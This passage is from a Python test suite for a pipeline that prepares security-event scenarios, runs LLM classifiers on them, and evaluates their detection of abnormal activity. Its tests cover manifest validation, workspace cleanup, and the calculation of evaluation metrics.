# --------------------------------------------------------------------------- #
def test_load_neutral_inputs_ignores_stray_files_not_in_manifest(tmp_path):
    prepared_dir = tmp_path / "prepared"
    neutral_dir = prepared_dir / "neutral_inputs"
    neutral_dir.mkdir(parents=True)
    manifest_path = prepared_dir / "frozen_external_manifest.csv"
    (neutral_dir / "EXT_001.json").write_text(json.dumps({"a": 1}), encoding="utf-8")
    (neutral_dir / "EXT_999.json").write_text(json.dumps({"a": 999}), encoding="utf-8")  # stray
    oc.write_csv(manifest_path, ["external_scenario_id"], [{"external_scenario_id": "EXT_001"}])

    orig_manifest, orig_neutral = oc.FROZEN_MANIFEST_PATH, oc.NEUTRAL_INPUTS_DIR
    oc.FROZEN_MANIFEST_PATH, oc.NEUTRAL_INPUTS_DIR = manifest_path, neutral_dir
    try:
        loaded = oc.load_neutral_inputs()
        ids = [sid for sid, _ in loaded]
        assert ids == ["EXT_001"]
        assert "EXT_999" not in ids
    finally:
        oc.FROZEN_MANIFEST_PATH, oc.NEUTRAL_INPUTS_DIR = orig_manifest, orig_neutral


def test_load_neutral_inputs_raises_if_manifest_scenario_missing_file(tmp_path):
    prepared_dir = tmp_path / "prepared"
    neutral_dir = prepared_dir / "neutral_inputs"
    neutral_dir.mkdir(parents=True)
    manifest_path = prepared_dir / "frozen_external_manifest.csv"
    oc.write_csv(manifest_path, ["external_scenario_id"],
                 [{"external_scenario_id": "EXT_001"}, {"external_scenario_id": "EXT_002"}])
    (neutral_dir / "EXT_001.json").write_text(json.dumps({"a": 1}), encoding="utf-8")
    # EXT_002.json intentionally missing

    orig_manifest, orig_neutral = oc.FROZEN_MANIFEST_PATH, oc.NEUTRAL_INPUTS_DIR
    oc.FROZEN_MANIFEST_PATH, oc.NEUTRAL_INPUTS_DIR = manifest_path, neutral_dir
    try:
        try:
            oc.load_neutral_inputs()
            assert False, "expected SystemExit for a manifest scenario with no neutral-input file"
        except SystemExit:
            pass
    finally:
        oc.FROZEN_MANIFEST_PATH, oc.NEUTRAL_INPUTS_DIR = orig_manifest, orig_neutral


# --------------------------------------------------------------------------- #
# 17. Script-level integration tests (prepare / cleanup / evaluate)          #
# --------------------------------------------------------------------------- #
_PATCHABLE_ATTRS = [
    "ROOT_DIR", "EXTERNAL_DIR", "CONFIG_DIR", "SOURCE_DIR", "PREPARED_DIR", "NEUTRAL_INPUTS_DIR",
    "RETRIEVAL_DIR", "OUTPUTS_BASELINE_DIR", "OUTPUTS_RAG_DIR", "EVALUATION_DIR", "LOGS_DIR",
    "FROZEN_MANIFEST_PATH", "EXTERNAL_GROUND_TRUTH_PATH", "FROZEN_RETRIEVAL_PLAN_PATH",
]


def _patch_paths(tmp_path: Path) -> dict:
    """Redirect otrf_common's module-level path constants into tmp_path so a
    pipeline script's main() can be exercised end-to-end without touching the
    real external_validation/ workspace. Every otrf_*.py script does
    `import otrf_common as oc`, which is the SAME cached module object within
    one process, so mutating attributes here is visible to every script.
    Derived constants computed once at otrf_common import time (KNOWLEDGE_BASE_DIR,
    DATASET_DIR, VOCAB_PATH) are deliberately left pointing at the real project
    files -- retrieval/vocabulary tests need the real knowledge base."""
    external_dir = tmp_path / "external_validation"
    new_values = {
        "ROOT_DIR": tmp_path,
        "EXTERNAL_DIR": external_dir,
        "CONFIG_DIR": external_dir / "config",
        "SOURCE_DIR": external_dir / "source",
        "PREPARED_DIR": external_dir / "prepared",
        "NEUTRAL_INPUTS_DIR": external_dir / "prepared" / "neutral_inputs",
        "RETRIEVAL_DIR": external_dir / "retrieval",
        "OUTPUTS_BASELINE_DIR": external_dir / "outputs_baseline",
        "OUTPUTS_RAG_DIR": external_dir / "outputs_rag",
        "EVALUATION_DIR": external_dir / "evaluation",
        "LOGS_DIR": external_dir / "logs",
        "FROZEN_MANIFEST_PATH": external_dir / "prepared" / "frozen_external_manifest.csv",
        "EXTERNAL_GROUND_TRUTH_PATH": external_dir / "prepared" / "external_ground_truth.csv",
        "FROZEN_RETRIEVAL_PLAN_PATH": external_dir / "retrieval" / "frozen_otrf_retrieval_plan.jsonl",
    }
    originals = {name: getattr(oc, name) for name in _PATCHABLE_ATTRS}
    for name, value in new_values.items():
        setattr(oc, name, value)
    return originals


def _restore_paths(originals: dict) -> None:
    for name, value in originals.items():
        setattr(oc, name, value)


def _write_config(tmp_path: Path, manifest_csv: Path) -> Path:
    cfg = {
        "config_version": "otrf-test-1.0.0",
        "dataset_manifest_csv": str(manifest_csv),
        "source_dir": str(tmp_path / "external_validation" / "source"),
        "window": {"max_events_per_scenario": 5000},
        "models": ["llama3"],
        "top_k": 3,
        "seed": 2026,
        "bootstrap_iters": 200,
    }
    cfg_path = tmp_path / "config.json"
    cfg_path.write_text(json.dumps(cfg), encoding="utf-8")
    return cfg_path


def test_prepare_rejects_duplicate_manifest_ids(tmp_path):
    src1 = tmp_path / "external_validation" / "source" / "a.jsonl"
    write_jsonl(src1, ABNORMAL_EVENTS)
    manifest_csv = tmp_path / "manifest.csv"
    oc.write_csv(manifest_csv,
                 ["external_scenario_id", "source_relative_path", "attack_or_benign_label"],
                 [{"external_scenario_id": "EXT_001", "source_relative_path": str(src1),
                   "attack_or_benign_label": "attack"},
                  {"external_scenario_id": "EXT_001", "source_relative_path": str(src1),
                   "attack_or_benign_label": "attack"}])
    cfg_path = _write_config(tmp_path, manifest_csv)

    originals = _patch_paths(tmp_path)
    try:
        prep = load_script("8-prepare-otrf-external.py")
        prep.main(["--config", str(cfg_path)])
        rows = oc.read_csv(oc.FROZEN_MANIFEST_PATH)
        assert len(rows) == 1
        audit = oc.read_csv(oc.PREPARED_DIR / "adapter_audit.csv")
        assert any(r["status"] == "duplicate_manifest_id" for r in audit)
    finally:
        _restore_paths(originals)


def test_prepare_maps_unsupported_label_to_unknown(tmp_path):
    src1 = tmp_path / "external_validation" / "source" / "a.jsonl"
    write_jsonl(src1, ABNORMAL_EVENTS)
    manifest_csv = tmp_path / "manifest.csv"
    oc.write_csv(manifest_csv,
                 ["external_scenario_id", "source_relative_path", "attack_or_benign_label"],
                 [{"external_scenario_id": "EXT_001", "source_relative_path": str(src1),
                   "attack_or_benign_label": "suspicious_maybe"}])
    cfg_path = _write_config(tmp_path, manifest_csv)

    originals = _patch_paths(tmp_path)
    try:
        prep = load_script("8-prepare-otrf-external.py")
        prep.main(["--config", str(cfg_path)])
        gt = oc.read_csv(oc.EXTERNAL_GROUND_TRUTH_PATH)
        assert gt[0]["external_class"] == "unknown"
    finally:
        _restore_paths(originals)


def test_prepare_overwrite_removes_stale_neutral_inputs(tmp_path):
    src1 = tmp_path / "external_validation" / "source" / "a.jsonl"
    src2 = tmp_path / "external_validation" / "source" / "b.jsonl"
    write_jsonl(src1, ABNORMAL_EVENTS)
    write_jsonl(src2, BENIGN_EVENTS)
    manifest_csv = tmp_path / "manifest.csv"
    oc.write_csv(manifest_csv,
                 ["external_scenario_id", "source_relative_path", "attack_or_benign_label"],
                 [{"external_scenario_id": "EXT_001", "source_relative_path": str(src1),
                   "attack_or_benign_label": "attack"},
                  {"external_scenario_id": "EXT_002", "source_relative_path": str(src2),
                   "attack_or_benign_label": "benign"}])
    cfg_path = _write_config(tmp_path, manifest_csv)

    originals = _patch_paths(tmp_path)
    try:
        prep = load_script("8-prepare-otrf-external.py")
        prep.main(["--config", str(cfg_path)])
        assert (oc.NEUTRAL_INPUTS_DIR / "EXT_001.json").exists()
        assert (oc.NEUTRAL_INPUTS_DIR / "EXT_002.json").exists()

        # Shrink the manifest to just EXT_001 and re-run with --overwrite.
        oc.write_csv(manifest_csv,
                     ["external_scenario_id", "source_relative_path", "attack_or_benign_label"],
                     [{"external_scenario_id": "EXT_001", "source_relative_path": str(src1),
                       "attack_or_benign_label": "attack"}])
        prep.main(["--config", str(cfg_path), "--overwrite"])
        assert (oc.NEUTRAL_INPUTS_DIR / "EXT_001.json").exists()
        assert not (oc.NEUTRAL_INPUTS_DIR / "EXT_002.json").exists(), \
            "stale neutral input for a scenario removed from the manifest must not survive --overwrite"
    finally:
        _restore_paths(originals)


def test_cleanup_dry_run_removes_nothing(tmp_path):
    originals = _patch_paths(tmp_path)
    try:
        oc.NEUTRAL_INPUTS_DIR.mkdir(parents=True, exist_ok=True)
        marker = oc.NEUTRAL_INPUTS_DIR / "EXT_001.json"
        marker.write_text("{}", encoding="utf-8")
        cleanup = load_script("12-cleanup-otrf-workspace.py")
        cleanup.main(["--dry-run", "--targets", "neutral_inputs"])
        assert marker.exists(), "dry-run must not delete anything"
    finally:
        _restore_paths(originals)


def test_cleanup_confirmed_removes_generated_targets(tmp_path):
    originals = _patch_paths(tmp_path)
    try:
        oc.NEUTRAL_INPUTS_DIR.mkdir(parents=True, exist_ok=True)
        marker = oc.NEUTRAL_INPUTS_DIR / "EXT_001.json"
        marker.write_text("{}", encoding="utf-8")
        cleanup = load_script("12-cleanup-otrf-workspace.py")
        cleanup.main(["--confirm-clean", "--targets", "neutral_inputs"])
        assert not marker.exists()
        assert oc.NEUTRAL_INPUTS_DIR.exists(), "the directory itself should remain (recreated empty)"
    finally:
        _restore_paths(originals)


def test_cleanup_without_confirm_flag_is_a_dry_run(tmp_path):
    originals = _patch_paths(tmp_path)
    try:
        oc.NEUTRAL_INPUTS_DIR.mkdir(parents=True, exist_ok=True)
        marker = oc.NEUTRAL_INPUTS_DIR / "EXT_001.json"
        marker.write_text("{}", encoding="utf-8")
        cleanup = load_script("12-cleanup-otrf-workspace.py")
        cleanup.main(["--targets", "neutral_inputs"])  # no --confirm-clean, no --dry-run
        assert marker.exists(), "absence of --confirm-clean must behave as dry-run"
    finally:
        _restore_paths(originals)


def test_cleanup_reset_frozen_archives_before_removing(tmp_path):
    originals = _patch_paths(tmp_path)
    try:
        oc.PREPARED_DIR.mkdir(parents=True, exist_ok=True)
        oc.RETRIEVAL_DIR.mkdir(parents=True, exist_ok=True)
        oc.FROZEN_MANIFEST_PATH.write_text("external_scenario_id\nEXT_001\n", encoding="utf-8")
        cleanup = load_script("12-cleanup-otrf-workspace.py")
        cleanup.main(["--confirm-clean", "--targets", "neutral_inputs", "--reset-frozen"])
        assert not oc.FROZEN_MANIFEST_PATH.exists()
        archive_root = oc.EXTERNAL_DIR / "archive"
        assert archive_root.exists()
        archived_files = list(archive_root.rglob("frozen_external_manifest.csv"))
        assert len(archived_files) == 1
        assert archived_files[0].read_text(encoding="utf-8") == "external_scenario_id\nEXT_001\n"
    finally:
        _restore_paths(originals)


def _write_model_record(path: Path, ext_id: str, pred_class: str, classification_valid: bool = True,
                        strict_valid: bool = True) -> None:
    oc.append_jsonl(path, {
        "external_scenario_id": ext_id, "json_parse_valid": True, "required_keys_valid": True,
        "classification_valid": classification_valid, "risk_level_valid": True,
        "indicator_list_valid": True, "strict_schema_valid": strict_valid,
        "timeout": False, "empty_response": False, "fallback": not strict_valid,
        "retries_used": 0, "attempts_used": 1, "total_latency_seconds": 1.0,
        "predicted_class": pred_class, "predicted_risk": "high", "predicted_indicators": [],
    })


def test_evaluator_missing_output_denominator_and_separate_fallback(tmp_path):
    originals = _patch_paths(tmp_path)
    try:
        oc.PREPARED_DIR.mkdir(parents=True, exist_ok=True)
        oc.NEUTRAL_INPUTS_DIR.mkdir(parents=True, exist_ok=True)
        (oc.NEUTRAL_INPUTS_DIR / "EXT_001.json").write_text("{}", encoding="utf-8")
        (oc.NEUTRAL_INPUTS_DIR / "EXT_002.json").write_text("{}", encoding="utf-8")
        oc.write_csv(oc.FROZEN_MANIFEST_PATH,
                     ["external_scenario_id", "source_path", "source_hash", "neutral_input_hash"],
                     [{"external_scenario_id": "EXT_001", "source_path": "", "source_hash": "not_available", "neutral_input_hash": ""},
                      {"external_scenario_id": "EXT_002", "source_path": "", "source_hash": "not_available", "neutral_input_hash": ""}])
        oc.write_csv(oc.EXTERNAL_GROUND_TRUTH_PATH,
                     ["external_scenario_id", "external_class"],
                     [{"external_scenario_id": "EXT_001", "external_class": "abnormal"},
                      {"external_scenario_id": "EXT_002", "external_class": "abnormal"}])
        model_dir = oc.OUTPUTS_BASELINE_DIR / "llama3"
        model_dir.mkdir(parents=True)
        raw = model_dir / "llama3_baseline_raw.jsonl"
        # EXT_001 gets a present-but-invalid (fallback) record; EXT_002 has none (missing).
        _write_model_record(raw, "EXT_001", pred_class="", classification_valid=False, strict_valid=False)

        cfg_path = tmp_path / "config.json"
        cfg_path.write_text(json.dumps({"models": ["llama3"]}), encoding="utf-8")
        ev = load_script("11-evaluate-otrf-external.py")
        ev.main(["--config", str(cfg_path)])

        rel = oc.read_csv(oc.EVALUATION_DIR / "output_reliability.csv")
        row = next(r for r in rel if r["condition"] == "baseline")
        assert float(row["missing_output_rate"]) == 0.5
        assert float(row["output_coverage_rate"]) == 0.5
        assert float(row["fallback_rate"]) == 0.5  # only the PRESENT invalid record, not the missing one

        abn = oc.read_csv(oc.EVALUATION_DIR / "abnormal_detection_results.csv")
        abn_base = next(r for r in abn if r["condition"] == "baseline")
        assert int(abn_base["abnormal_false_negatives"]) == 2  # both missing and fallback count as misses
    finally:
        _restore_paths(originals)


def test_evaluator_unknown_ground_truth_excluded_not_abnormal(tmp_path):
    originals = _patch_paths(tmp_path)
    try:
        oc.PREPARED_DIR.mkdir(parents=True, exist_ok=True)
        oc.NEUTRAL_INPUTS_DIR.mkdir(parents=True, exist_ok=True)
        (oc.NEUTRAL_INPUTS_DIR / "EXT_001.json").write_text("{}", encoding="utf-8")
        oc.write_csv(oc.FROZEN_MANIFEST_PATH,
                     ["external_scenario_id", "source_path", "source_hash", "neutral_input_hash"],
                     [{"external_scenario_id": "EXT_001", "source_path": "", "source_hash": "not_available", "neutral_input_hash": ""}])
        oc.write_csv(oc.EXTERNAL_GROUND_TRUTH_PATH,
                     ["external_scenario_id", "external_class"],
                     [{"external_scenario_id": "EXT_001", "external_class": "unknown"}])
        model_dir = oc.OUTPUTS_BASELINE_DIR / "llama3"
        model_dir.mkdir(parents=True)
        raw = model_dir / "llama3_baseline_raw.jsonl"
        _write_model_record(raw, "EXT_001", pred_class="normal")

        cfg_path = tmp_path / "config.json"
        cfg_path.write_text(json.dumps({"models": ["llama3"]}), encoding="utf-8")
        ev = load_script("11-evaluate-otrf-external.py")
        ev.main(["--config", str(cfg_path)])

        abn = oc.read_csv(oc.EVALUATION_DIR / "abnormal_detection_results.csv")
        assert abn[0]["n_abnormal"] == "0"   # unknown truth never defaulted to abnormal
        summary = json.loads((oc.EVALUATION_DIR / "validation_summary.json").read_text(encoding="utf-8"))
        assert summary["n_unknown_ground_truth"] == 1
    finally:
        _restore_paths(originals)


def test_evaluator_duplicate_outputs_fail_by_default(tmp_path):
    originals = _patch_paths(tmp_path)
    try:
        oc.PREPARED_DIR.mkdir(parents=True, exist_ok=True)
        oc.NEUTRAL_INPUTS_DIR.mkdir(parents=True, exist_ok=True)
        (oc.NEUTRAL_INPUTS_DIR / "EXT_001.json").write_text("{}", encoding="utf-8")
        oc.write_csv(oc.FROZEN_MANIFEST_PATH,
                     ["external_scenario_id", "source_path", "source_hash", "neutral_input_hash"],
                     [{"external_scenario_id": "EXT_001", "source_path": "", "source_hash": "not_available", "neutral_input_hash": ""}])
        oc.write_csv(oc.EXTERNAL_GROUND_TRUTH_PATH,
                     ["external_scenario_id", "external_class"],
                     [{"external_scenario_id": "EXT_001", "external_class": "abnormal"}])
        model_dir = oc.OUTPUTS_BASELINE_DIR / "llama3"
        model_dir.mkdir(parents=True)
        raw = model_dir / "llama3_baseline_raw.jsonl"
        _write_model_record(raw, "EXT_001", pred_class="abnormal")
        _write_model_record(raw, "EXT_001", pred_class="abnormal")  # duplicate

        cfg_path = tmp_path / "config.json"
        cfg_path.write_text(json.dumps({"models": ["llama3"]}), encoding="utf-8")
        ev = load_script("11-evaluate-otrf-external.py")
        try:
            ev.main(["--config", str(cfg_path)])
            assert False, "expected SystemExit on duplicate outputs"
        except SystemExit:
            pass
        # With the override flag, evaluation proceeds.
        ev.main(["--config", str(cfg_path), "--allow-duplicates"])
        assert (oc.EVALUATION_DIR / "validation_summary.json").exists()
    finally:
        _restore_paths(originals)


def test_evaluator_hash_drift_fails_by_default(tmp_path):
    originals = _patch_paths(tmp_path)
    try:
        oc.PREPARED_DIR.mkdir(parents=True, exist_ok=True)
        oc.NEUTRAL_INPUTS_DIR.mkdir(parents=True, exist_ok=True)
        neutral_path = oc.NEUTRAL_INPUTS_DIR / "EXT_001.json"
        neutral_path.write_text(json.dumps({"a": 1}), encoding="utf-8")
        oc.write_csv(oc.FROZEN_MANIFEST_PATH,
                     ["external_scenario_id", "source_path", "source_hash", "neutral_input_hash"],
                     [{"external_scenario_id": "EXT_001", "source_path": "", "source_hash": "not_available",
                       "neutral_input_hash": "0" * 64}])  # deliberately wrong
        oc.write_csv(oc.EXTERNAL_GROUND_TRUTH_PATH,
                     ["external_scenario_id", "external_class"],
                     [{"external_scenario_id": "EXT_001", "external_class": "abnormal"}])
        cfg_path = tmp_path / "config.json"
        cfg_path.write_text(json.dumps({"models": ["llama3"]}), encoding="utf-8")
        ev = load_script("11-evaluate-otrf-external.py")
        try:
            ev.main(["--config", str(cfg_path)])
            assert False, "expected SystemExit on neutral-input hash drift"
        except SystemExit:
            pass
        ev.main(["--config", str(cfg_path), "--allow-hash-drift"])  # proceeds with override
        assert (oc.EVALUATION_DIR / "validation_summary.json").exists()
    finally:
        _restore_paths(originals)


# --------------------------------------------------------------------------- #
# Runs without pytest too                                                     #
# --------------------------------------------------------------------------- #
if __name__ == "__main__":
    import tempfile
    import traceback

    passed = failed = 0
    failures = []
    fns = {name: obj for name, obj in sorted(globals().items())
           if name.startswith("test_") and callable(obj)}
    for name, fn in fns.items():
        argcount = fn.__code__.co_argcount
        try:
            if argcount == 0:
                fn()
            else:
                with tempfile.TemporaryDirectory() as d:
                    fn(Path(d))
            passed += 1
            print(f"PASS  {name}")
        except Exception as exc:  # noqa: BLE001
            failed += 1
            failures.append((name, exc))
            print(f"FAIL  {name}: {exc}")
            traceback.print_exc()
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
